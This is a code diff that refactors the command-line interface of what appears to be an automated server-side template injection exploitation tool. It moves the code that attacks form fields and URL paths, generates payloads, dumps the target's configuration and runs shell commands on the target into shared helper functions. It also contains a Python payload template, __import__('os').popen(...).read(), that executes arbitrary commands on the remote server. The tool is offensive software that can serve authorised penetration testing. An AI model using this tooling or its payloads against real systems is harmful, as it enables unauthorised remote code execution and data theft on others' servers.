@@ -4,7 +4,7 @@
 import logging
 
 from urllib.parse import urlparse
-from typing import Callable, List, Dict
+from typing import Callable, List, Dict, Tuple, Union
 from functools import partial
 
 import click
@@ -17,7 +17,7 @@ from .const import (
 )
 from .colorize import colored, set_enable_coloring
 from .cracker import Cracker
-from .form import get_form
+from .form import Form, get_form
 from .full_payload_gen import FullPayloadGen
 from .requester import Requester
 from .submitter import Submitter, PathSubmitter, FormSubmitter, shell_tamperer
@@ -46,9 +46,10 @@ LOGGING_FORMAT = "%(levelname)s:[%(name)s] | %(message)s"
 logging.basicConfig(level=logging.INFO, format=LOGGING_FORMAT)
 logger = logging.getLogger("cli")
 
+
 class RunFailed(Exception):
-    """用于通知main和unit test运行失败的exception
-    """
+    """用于通知main和unit test运行失败的exception"""
+
 
 def cmd_exec_submitter(
     cmd: str, submitter: Submitter, full_payload_gen: FullPayloadGen
@@ -121,6 +122,7 @@ def interact(cmd_exec_func: Callable):
             break
         result = cmd_exec_func(cmd)
         print(result)
+    logger.warning("Bye!")
 
 
 def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
@@ -147,6 +149,173 @@ def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, st
     if cookies:
         headers["Cookie"] = cookies
     return headers
+
+
+def do_crack_form_pre(
+    url: str,
+    form: Form,
+    requester: Requester,
+    detect_mode: str,
+    tamper_cmd: Union[str, None],
+) -> Union[Tuple[FullPayloadGen, Submitter], None]:
+    """攻击一个表单并获得结果
+
+    Args:
+        url (str): 表单所在的url
+        form (Form): 表单
+        requester (Requester): 发起请求的类
+        detect_mode (str): 分析模式
+        tamper_cmd (Union[str, None]): tamper命令，用于在提交时修改payload
+
+    Returns:
+        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
+    """
+    for input_field in form["inputs"]:
+        submitter = FormSubmitter(
+            url,
+            form,
+            input_field,
+            requester,
+        )
+        if tamper_cmd:
+            tamperer = shell_tamperer(tamper_cmd)
+            submitter.add_tamperer(tamperer)
+        cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
+        full_payload_gen = cracker.crack()
+        if full_payload_gen:
+            return full_payload_gen, submitter
+    return None
+
+
+def do_crack_form_eval_args_pre(
+    url: str,
+    form: Form,
+    requester: Requester,
+    detect_mode: str,
+    tamper_cmd: Union[str, None],
+) -> Union[Tuple[Submitter, bool], None]:
+    """攻击一个表单并获得结果，但是将payload放在GET/POST参数中提交
+
+    Args:
+        url (str): 表单所在的url
+        form (Form): 表单
+        requester (Requester): 发起请求的类
+        detect_mode (str): 分析模式
+        tamper_cmd (Union[str, None]): tamper命令，用于在提交时修改payload
+
+    Returns:
+        Union[Tuple[Submitter, bool], None]: 攻击结果
+    """
+    for input_field in form["inputs"]:
+        submitter = FormSubmitter(
+            url,
+            form,
+            input_field,
+            requester,
+        )
+        if tamper_cmd:
+            tamperer = shell_tamperer(tamper_cmd)
+            submitter.add_tamperer(tamperer)
+        cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
+        result = cracker.crack_eval_args()
+        if result:
+            _, submitter, will_print = result
+            return submitter, will_print
+    return None
+
+
+def do_crack_path_pre(
+    url: str, requester: Requester, detect_mode: str, tamper_cmd: Union[str, None]
+) -> Union[Tuple[FullPayloadGen, Submitter], None]:
+    """攻击一个路径并获得payload生成器
+
+    Args:
+        url (str): 需要攻击的url
+        requester (Requester): 发送请求的类
+        detect_mode (str): 分析模式
+        tamper_cmd (Union[str, None]): tamper命令
+
+    Returns:
+        Union[Tuple[FullPayloadGen, Submitter], None]: 攻击结果
+    """
+    submitter = PathSubmitter(url=url, requester=requester)
+    if tamper_cmd:
+        tamperer = shell_tamperer(tamper_cmd)
+        submitter.add_tamperer(tamperer)
+    cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
+    full_payload_gen = cracker.crack()
+    if full_payload_gen is None:
+        return None
+    return full_payload_gen, submitter
+
+
+def do_crack(
+    full_payload_gen: FullPayloadGen, submitter: Submitter, exec_cmd: Union[str, None]
+):
+    """使用payload生成器攻击对应的表单参数/路径
+
+    Args:
+        full_payload_gen (FullPayloadGen): payload生成器
+        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
+        exec_cmd (Union[str, None]): 需要执行的命令
+    """
+    cmd_exec_func = partial(
+        cmd_exec_submitter,
+        submitter=submitter,
+        full_payload_gen=full_payload_gen,
+    )
+    if exec_cmd:
+        print(cmd_exec_func(exec_cmd))
+    else:
+        interact(cmd_exec_func)
+
+
+def do_crack_eval_args(
+    submitter: Submitter, will_print: bool, exec_cmd: Union[str, None]
+):
+    """攻击对应的表单参数/路径，但是使用eval_args方法
+
+    Args:
+        submitter (Submitter): payload提交器，用于提交payload到特定的表单/路径
+        will_print (bool): 是否会产生回显
+        exec_cmd (Union[str, None]): 需要执行的命令
+    """
+    cmd_exec_func = partial(
+        cmd_exec_generate_func,
+        submitter=submitter,
+        generate_func=lambda x: f"__import__('os').popen({repr(x)}).read()",
+        will_print=will_print,
+    )
+    if exec_cmd:
+        print(cmd_exec_func(exec_cmd))
+    else:
+        interact(cmd_exec_func)
+
+
+def do_get_config(full_payload_gen: FullPayloadGen, submitter: Submitter) -> bool:
+    """攻击对应的目标并获得config
+
+    Args:
+        full_payload_gen (FullPayloadGen): payload生成器
+        submitter (Submitter): payload提交器
+
+    Returns:
+        bool: 是否成功
+    """
+    payload, will_print = full_payload_gen.generate(CONFIG)
+    if not payload:
+        logger.error("The generator %s generating payload", colored("red", "failed"))
+        return False
+    if not will_print:
+        logger.error(
+            "The generated payload %s respond config.",
+            colored("red", "won't"),
+        )
+        return False
+    resp = submitter.submit(payload)
+    assert resp is not None
+    print(resp.text)
+    return True
 
 
 @click.group()
@@ -197,41 +366,14 @@ def get_config(
         headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
         proxy=proxy,
     )
-    tamperer = None
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
-    found, submitter, full_payload_gen = False, None, None
-    for input_field in form["inputs"]:
-        submitter = FormSubmitter(url, form, input_field, requester)
-        if tamperer:
-            submitter.add_tamperer(tamperer)
-        cracker = Cracker(submitter, detect_mode=detect_mode)
-        if not cracker.has_respond():
-            logger.info("Test input field %s failed, continue...", input_field)
-            continue
-        full_payload_gen = cracker.crack()
-        if not full_payload_gen:
-            logger.info("Test input field %s failed, continue...", input_field)
-            continue
-        found = True
-    if not found:
+    result = do_crack_form_pre(url, form, requester, detect_mode, tamper_cmd)
+    if not result:
         logger.warning("Test form failed...")
         raise RunFailed()
-    assert submitter is not None and full_payload_gen is not None
-
-    payload, will_print = full_payload_gen.generate(CONFIG)
-    if not payload:
-        logger.error("The generator %s generating payload", colored("red", "failed"))
+    full_payload_gen, submitter = result
+    success = do_get_config(full_payload_gen, submitter)
+    if not success:
         raise RunFailed()
-    if not will_print:
-        logger.error(
-            "The generated payload %s respond config.",
-            colored("red", "won't"),
-        )
-        raise RunFailed()
-    resp = submitter.submit(payload)
-
-    print(resp.text if resp is not None else None)
 
 
 @main.command()
@@ -286,52 +428,22 @@ def crack(
         headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
         proxy=proxy,
     )
-    tamperer = None
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
-    found, submitter, result = False, None, None
-    for input_field in form["inputs"]:
-        submitter = FormSubmitter(url, form, input_field, requester)
-        if tamperer:
-            submitter.add_tamperer(tamperer)
-        cracker = Cracker(submitter, detect_mode=detect_mode)
-        if not cracker.has_respond():
-            logger.info("Test input field %s failed, continue...", input_field)
-            continue
-        if eval_args_payload:
-            result = cracker.crack_eval_args()
-        else:
-            result = cracker.crack()
+    if not eval_args_payload:
+        result = do_crack_form_pre(url, form, requester, detect_mode, tamper_cmd)
         if not result:
-            logger.info("Test input field %s failed, continue...", input_field)
-            continue
-        found = True
-    if not found:
-        logger.warning("Test form failed...")
-        raise RunFailed()
-    assert submitter is not None and result is not None
-    if eval_args_payload:
-        assert isinstance(result, tuple)
-        full_payload_gen, submitter, will_print = result
-        cmd_exec_func = partial(
-            cmd_exec_generate_func,
-            submitter=submitter,
-            generate_func=lambda x: f"__import__('os').popen({repr(x)}).read()",
-            will_print=will_print,
-        )
+            logger.warning("Test form failed...")
+            raise RunFailed()
+        full_payload_gen, submitter = result
+        do_crack(full_payload_gen, submitter, exec_cmd)
     else:
-        assert isinstance(result, FullPayloadGen)
-        full_payload_gen = result
-        cmd_exec_func = partial(
-            cmd_exec_submitter,
-            submitter=submitter,
-            full_payload_gen=full_payload_gen,
+        result = do_crack_form_eval_args_pre(
+            url, form, requester, detect_mode, tamper_cmd
         )
-    if exec_cmd == "":
-        interact(cmd_exec_func)
-    else:
-        print(cmd_exec_func(exec_cmd))
-    logger.warning("Bye!")
+        if not result:
+            logger.warning("Test form failed...")
+            raise RunFailed()
+        submitter, will_print = result
+        do_crack_eval_args(submitter, will_print, exec_cmd)
 
 
 @main.command()
@@ -368,25 +480,17 @@ def crack_path(
         headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
         proxy=proxy,
     )
-    submitter = PathSubmitter(url=url, requester=requester)
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
-        submitter.add_tamperer(tamperer)
-    cracker = Cracker(submitter=submitter, detect_mode=detect_mode)
-    full_payload_gen = cracker.crack()
-    if full_payload_gen is None:
+    result = do_crack_path_pre(
+        url,
+        requester,
+        detect_mode,
+        tamper_cmd,
+    )
+    if not result:
         logger.warning("Test form failed...")
         raise RunFailed()
-    cmd_exec_func = partial(
-        cmd_exec_submitter,
-        submitter=submitter,
-        full_payload_gen=full_payload_gen,
-    )
-    if exec_cmd == "":
-        interact(cmd_exec_func)
-    else:
-        print(cmd_exec_func(exec_cmd))
-    logger.warning("Bye!")
+    full_payload_gen, submitter = result
+    do_crack(full_payload_gen, submitter, exec_cmd)
 
 
 @main.command()
@@ -427,32 +531,16 @@ def scan(
         for (page_url, forms) in yield_form(requester, url)
         for form in forms
     )
-    tamperer = None
-    if tamper_cmd:
-        tamperer = shell_tamperer(tamper_cmd)
     for page_url, form in url_forms:
-        for input_field in form["inputs"]:
-            submitter = FormSubmitter(page_url, form, input_field, requester)
-            if tamperer:
-                submitter.add_tamperer(tamperer)
-            cracker = Cracker(submitter, detect_mode=detect_mode)
-            if not cracker.has_respond():
-                continue
-            full_payload_gen = cracker.crack()
-            if full_payload_gen is None:
-                continue
-            cmd_exec_func = partial(
-                cmd_exec_submitter,
-                submitter=submitter,
-                full_payload_gen=full_payload_gen,
-            )
-            if exec_cmd == "":
-                interact(cmd_exec_func)
-            else:
-                print(cmd_exec_func(exec_cmd))
-            return
+        result = do_crack_form_pre(page_url, form, requester, detect_mode, tamper_cmd)
+        if not result:
+            continue
+        full_payload_gen, submitter = result
+        do_crack(full_payload_gen, submitter, exec_cmd)
+        return
     logger.warning("Scan failed...")
     raise RunFailed()
+
 
 @main.command()
 @click.option("--host", "-h", default="127.0.0.1", help="需要监听的host, 默认为127.0.0.1")
